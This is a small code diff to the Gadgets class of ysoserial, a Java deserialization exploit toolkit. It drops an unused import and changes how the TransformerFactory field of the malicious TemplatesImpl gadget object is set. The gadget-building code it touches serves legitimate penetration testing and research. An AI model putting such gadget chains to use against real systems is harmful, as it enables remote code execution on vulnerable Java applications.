@@ -14,7 +14,6 @@ import java.util.Map;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
-import ysoserial.payloads.util.Gadgets.StubTransletPayload;
 
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
 import com.sun.org.apache.xalan.internal.xsltc.TransletException;
@@ -113,7 +112,7 @@ public class Gadgets {
 
 		// required to make TemplatesImpl happy
 		Reflections.setFieldValue(templates, "_name", "Pwnr");
-		Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
+		Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
 		return templates;
 	}
 	
